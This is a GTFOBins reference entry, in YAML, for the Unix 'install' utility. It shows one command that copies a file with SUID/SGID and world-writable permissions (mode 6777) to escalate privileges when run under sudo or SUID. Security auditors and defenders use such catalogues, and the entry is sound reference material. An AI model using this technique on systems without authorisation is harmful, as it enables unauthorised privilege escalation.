<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/install -->
---
functions:
  privilege-escalation:
  - code: |-
      install -m 6777 /path/to/input-file /path/to/output-dir/
    comment: |-
      This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.
    contexts:
      sudo:
      suid:
...
